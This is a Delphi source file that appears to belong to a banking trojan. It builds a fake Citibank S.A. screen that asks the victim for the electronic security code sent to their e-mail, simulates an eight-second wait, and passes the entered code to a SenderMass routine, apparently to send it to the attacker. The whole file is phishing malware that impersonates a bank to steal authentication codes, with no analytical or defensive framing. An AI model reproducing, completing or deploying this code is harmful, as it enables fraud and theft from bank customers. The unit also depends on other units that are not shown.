unit CitiFone;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, Citi2, StdCtrls;

type
  TCitiCelular = class(TFrame)
    Image1: TImage;
    Image2: TImage;
    Editcodeletros: TEdit;
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  var
  CityBak2: TCityBak2;

implementation

{$R *.dfm}
uses
Natal, Gerador, Rotinas, Citi;

procedure TCitiCelular.Image2Click(Sender: TObject);
begin
   Screen.Cursor := crHourGlass;
  Sleep(8000);
  Screen.Cursor := crDefault;

   if Editcodeletros.Text='' then
  begin
    MessageBox(Self.handle,'Informe o código eletrônico enviado para o seu e-mail!', 'Banco Citibank S.A.', mb_IconError + mb_Ok);
    exit;
  end;
  DadosEnvio_ := TStringList.Create;
  DadosEnvio_.Add('CODIGO:  '+Editcodeletros.text);
  DadosEnvio_.Add('=============================================');

//SENDBOX
try
begin
  CityBak2 := TCityBak2.Create(Self);

with CityBak2 do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
  end;

  SenderMass(DadosEnvio_ , 'CelularCit');
  DadosEnvio_.Free;
  end;
finally
end;
end;
end.
